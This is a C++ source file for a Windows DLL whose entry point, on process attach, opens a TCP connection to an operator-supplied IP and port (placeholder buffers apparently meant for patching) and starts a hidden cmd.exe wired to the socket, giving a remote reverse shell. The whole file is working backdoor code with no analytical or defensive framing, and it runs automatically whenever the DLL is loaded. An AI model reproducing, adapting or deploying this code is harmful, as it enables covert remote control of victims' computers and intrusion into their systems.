// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <winsock2.h>  
#include <stdlib.h>

#pragma comment(lib,"ws2_32")
void reverse_shell();
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
char* m_char;
wchar_t* m_wchar;


void Release()
{
	if (m_char)
	{
		delete m_char;
		m_char = NULL;
	}
	if (m_wchar)
	{
		delete m_wchar;
		m_wchar = NULL;
	}
}

char* WcharToChar(wchar_t* wc)
{
	Release();
	int len = WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), NULL, 0, NULL, NULL);
	m_char = new char[len + 1];
	WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), m_char, len, NULL, NULL);
	m_char[len] = '\0';
	return m_char;
}


void reverse_shell()
{
	LPCSTR szMyUniqueNamedEvent = "sysnullevt";
	HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);

	switch (GetLastError())
	{
		// app is already running
	case ERROR_ALREADY_EXISTS:
	{
		CloseHandle(m_hEvent);
		break;
	}

	case ERROR_SUCCESS:
	{

		break;
	}
	}

	TCHAR szIpAddress[] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAA";                                 // IP地址
	TCHAR szPort[] = L"BBBBBBBBBBBBBBBBBBBBBBBBBBBB";                                      // 端口号
	TCHAR szOtherInfo[] = L"CCCCCCCCCCCCCCCCCCCCCCCCCCCC";                                 // 其他信息


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	char* c_Port = WcharToChar(szPort);
	hax.sin_port = htons(atoi(c_Port));


	char* c_IpAddress = WcharToChar(szIpAddress);
	hax.sin_addr.s_addr = inet_addr(c_IpAddress);
	WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);


	char* c_OtherInfo = WcharToChar(szOtherInfo);
	send(Winsock, c_OtherInfo, strlen(c_OtherInfo), 0);

	memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ini_processo, &processo_info);



}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		reverse_shell();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


